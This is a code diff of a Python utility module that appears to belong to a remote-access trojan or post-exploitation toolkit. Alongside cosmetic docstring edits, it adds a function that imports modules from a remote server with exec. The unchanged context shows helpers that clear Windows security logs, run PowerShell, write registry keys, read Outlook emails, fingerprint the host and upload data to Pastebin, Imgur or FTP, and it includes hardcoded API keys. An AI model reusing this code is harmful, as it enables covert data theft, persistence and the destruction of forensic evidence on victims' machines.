@@ -43,18 +43,18 @@ _debug  = True
 
 
 def tasklogger(host, port):
-    """
+    """ 
     Get a logger configured for reporting task results to server
     """
     logger  = logging.getLogger(public_ip())
-    handler = logging.SocketHandler(host, port)
+    handler = logging.handlers.SocketHandler(host, port)
     logger.setLevel(logging.DEBUG)
     logger.handlers = [handler]
     return logger
 
 
 def debug(info):
-    """
+    """ 
     Log debugging info
     """
     if _debug:
@@ -65,7 +65,7 @@ def debug(info):
 
 
 def platform():
-    """
+    """ 
     Return the OS/platform of host machine
     """
     try:
@@ -74,8 +74,21 @@ def platform():
         debug("{} error: {}".format(platform.func_name, str(e)))
 
 
+def imports(base_url='http://localhost:8000', modules=['configparser', 'Crypto', 'Cryptodome', 'cv2', 'httpimport', 'mss', 'numpy', 'pyHook', 'PyInstaller', 'pyminifier', 'pythoncom', 'pywin32', 'pyxhook', 'requests', 'twilio', 'uuid', 'win32', 'win32com', 'wmi', 'Xlib']):
+        """ 
+        import remotely without installing
+        """
+        with importer.remote_repo(modules, base_url):
+            for module in modules:
+                try:
+                    exec "import %s" % module in globals()
+                    debug("%s imported successfully." % module)
+                except ImportError:
+                    debug("%s import failed." % module)
+
+
 def public_ip():
-    """
+    """ 
     Return public IP address of host machine
     """
     try:
@@ -85,7 +98,7 @@ def public_ip():
 
 
 def local_ip():
-    """
+    """ 
     Return local IP address of host machine
     """
     try:
@@ -95,7 +108,7 @@ def local_ip():
 
 
 def mac_address():
-    """
+    """ 
     Return MAC address of host machine
     """
     try:
@@ -105,7 +118,7 @@ def mac_address():
 
 
 def architecture():
-    """
+    """ 
     Check if host machine has 32-bit or 64-bit processor architecture
     """
     try:
@@ -115,7 +128,7 @@ def architecture():
 
 
 def device():
-    """
+    """ 
     Return the name of the host machine
     """
     try:
@@ -125,7 +138,7 @@ def device():
 
 
 def username():
-    """
+    """ 
     Return username of current logged in user
     """
     try:
@@ -135,7 +148,7 @@ def username():
 
 
 def administrator():
-    """
+    """ 
     Return True if current user is administrator, otherwise False
     """
     try:
@@ -145,7 +158,7 @@ def administrator():
 
 
 def ipv4(address):
-    """
+    """ 
     Return True if input is valid IPv4 address, otherwise False
     """
     try:
@@ -156,7 +169,7 @@ def ipv4(address):
 
 
 def variable(length=6):
-    """
+    """ 
     Generate a random alphanumeric variable name of given length
     """
     try:
@@ -166,7 +179,7 @@ def variable(length=6):
 
 
 def status(timestamp):
-    """
+    """ 
     Check the status of a job/thread
     """
     try:
@@ -182,7 +195,7 @@ def status(timestamp):
 
 
 def post(url, headers={}, data={}):
-    """
+    """ 
     Make a HTTP post request and return response
     """
     try:
@@ -196,7 +209,7 @@ def post(url, headers={}, data={}):
 
 
 def alert(text, title):
-    """
+    """ 
     Windows alert message box
     """
     try:
@@ -209,7 +222,7 @@ def alert(text, title):
 
 
 def normalize(source):
-    """
+    """ 
     Normalize data/text/stream
     """
     try:
@@ -228,7 +241,7 @@ def normalize(source):
 
 
 def registry_key(registry_key, key, value):
-    """
+    """ 
     Create a new Windows Registry Key in HKEY_CURRENT_USER
     """
     if os.name is 'nt':
@@ -244,7 +257,7 @@ def registry_key(registry_key, key, value):
 
 
 def png(image):
-    """
+    """ 
     Takes input of raw image data and returns it a valid PNG data
     """
     try:
@@ -280,7 +293,7 @@ def png(image):
 
 
 def emails(emails):
-    """
+    """ 
     Takes input of emails from Outlook MAPI inbox and returns them in JSON format
     """
     try:
@@ -304,7 +317,7 @@ def emails(emails):
 
 
 def display(output, color=None, style=None, pretty=False, **kwargs):
-    """
+    """ 
     Pretty print output to console
     """
     _color = colorama.Fore.RESET
@@ -330,10 +343,10 @@ def display(output, color=None, style=None, pretty=False, **kwargs):
 
 
 def delete(target):
-    """
+    """ 
     Tries hard to delete file (via multiple methods, if necessary)
     """
-    if isinstance(target, str):
+    try:
         if os.path.isfile(target):
             try:
                 os.chmod(target, 777)
@@ -353,13 +366,13 @@ def delete(target):
                 _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
             except: pass
         else:
-            debug("{} error: file not found - '{}'".format(delete.func_name, filepath))
-    else:
-        debug("{} error: expected {}, received {}".format(delete.func_name, str, type(filepath)))
+            pass
+    except Exception as e:
+        debug("{} error: {}".format(delete.func_name, str(e)))
 
 
 def clear_system_logs():
-    """
+    """ 
     Clear Windows system logs (Application, Security, Setup, System)
     """
     if os.name is 'nt':
@@ -373,7 +386,7 @@ def clear_system_logs():
 
 
 def kwargs(inputstring):
-    """
+    """ 
     Takes a string as input and returns a dictionary of keyword arguments
     """
     try:
@@ -383,6 +396,9 @@ def kwargs(inputstring):
 
 
 def system_info():
+    """ 
+    Return information about the host machine
+    """
     info = {}
     for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
         if func in globals():
@@ -395,7 +411,7 @@ def system_info():
 
 
 def color():
-    """
+    """ 
     Returns a random color for use in console display
     """
     try:
@@ -406,7 +422,7 @@ def color():
 
 
 def powershell(code):
-    """
+    """ 
     Execute code in Powershell.exe and return any results
     """
     if os.name is 'nt':
@@ -418,7 +434,7 @@ def powershell(code):
 
 
 def imgur(source):
-    """
+    """ 
     Upload image file/data to Imgur (requires: imgur api_key)
     """
     try:
@@ -434,7 +450,7 @@ def imgur(source):
 
 
 def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_key='d05a18740c105927f3cbf38cf5acf069'):
-    """
+    """ 
     Dump file/data to Pastebin (requires: pastebin api_dev_key)
     """
     try:
@@ -448,7 +464,7 @@ def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_ke
 
 
 def ftp(source, filetype=None):
-    """
+    """ 
     Upload file/data to FTP server (requires: FTP login credentials)
     """
     try:
@@ -486,7 +502,7 @@ def ftp(source, filetype=None):
         return "{} error: {}".format(ftp.func_name, str(e2))
 
 def config(*arg, **options):
-    """
+    """ 
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
     """
     def _config(function):
@@ -501,7 +517,7 @@ def config(*arg, **options):
 
 
 def threaded(function):
-    """
+    """ 
     Decorator for making a function threaded
     """
     @functools.wraps(function)
@@ -514,7 +530,7 @@ def threaded(function):
 
 
 def loading_animation(function):
-    """
+    """ 
     Decorator for displaying a loading animation while the function runs in a separate thread
     """
     @functools.wraps(function)
@@ -529,7 +545,7 @@ def loading_animation(function):
 
 
 def progress_bar(function):
-    """
+    """ 
     Decorator for displaying a progress bar while the function is run in a separate thread
     """
     @functools.wraps(function)
@@ -561,7 +577,7 @@ def progress_bar(function):
     return function_progress
 
 def update_progress_bar(progress, length=50):
-    """
+    """ 
     Worker function for the progress bar decorator
     """
     if not isinstance(progress, float):
